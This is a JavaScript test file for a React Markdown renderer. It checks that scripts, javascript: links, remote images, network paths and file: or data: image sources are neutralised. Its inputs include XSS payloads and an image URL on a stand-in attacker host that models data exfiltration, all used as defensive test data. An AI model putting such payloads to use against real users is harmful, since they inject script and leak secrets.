import assert from 'node:assert/strict';
import {test, before, after} from 'node:test';
import React from 'react';
import {renderToStaticMarkup} from 'react-dom/server';
import {createServer} from 'vite';

let server, FormattedText;
before(async () => {
  server = await createServer({server: {middlewareMode: true, hmr: false}, appType: 'custom'});
  ({default: FormattedText} = await server.ssrLoadModule('/src/formatted_text.jsx'));
});
after(async () => {await server?.close();});

test('shared renderer produces headings, GFM tables, code and KaTeX', () => {
  const html = renderToStaticMarkup(React.createElement(FormattedText, {text:
    '# Heading\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```js\nconst x = 1;\n```\n\n\\(x^2\\)'}));
  assert.match(html, /<h1>Heading<\/h1>/);
  assert.match(html, /<table>/);
  assert.match(html, /<pre><code class="language-js">/);
  assert.match(html, /class="katex"/);
});

test('raw HTML and unsafe link protocols cannot execute model content', () => {
  const html = renderToStaticMarkup(React.createElement(FormattedText, {text:
    '<script>alert(1)</script>\n\n[unsafe](javascript:alert%281%29)'}));
  assert.doesNotMatch(html, /<script>|href="javascript:/);
});

test('local Markdown image references use the scoped media endpoint', () => {
  const html = renderToStaticMarkup(React.createElement(FormattedText, {text:
    '![asset](character_files/example.png)'}));
  assert.match(html, /\/api\/media\?path=character_files%2Fexample.png/);
});

test('remote Markdown images become click-to-open links and never load', () => {
  const html = renderToStaticMarkup(React.createElement(FormattedText, {text:
    '![chart](https://attacker.example/leak.png?data=secret) and ![](http://h.example/x.png)'}));
  assert.doesNotMatch(html, /<img/);
  assert.match(html, /<a class="image-link" href="https:\/\/attacker.example\/leak.png\?data=secret" target="_blank" rel="noreferrer"[^>]*>chart \(attacker.example\)<\/a>/);
  assert.match(html, />Image \(h.example\)<\/a>/);
});

test('network paths and other schemes in an image render neither an <img> nor a media request', () => {
  // Markdown \\ is one backslash, so the second source is \\attacker\share\x.png; react-markdown passes it as %5C%5C...
  for (const text of ['![x](//attacker/share/x.png)', '![x](\\\\\\\\attacker\\\\share\\\\x.png)', '![x](<\\\\\\\\attacker\\\\share>)',
    '![x](%5C%5Cattacker/x.png)', '![x](file:///etc/hosts)', '![x](data:image/png;base64,AAAA)']) {
    const html = renderToStaticMarkup(React.createElement(FormattedText, {text}));
    assert.doesNotMatch(html, /<img|\/api\/media|attacker|href=/, text);
    assert.match(html, /class="image-alt">x</, text);
  }
});
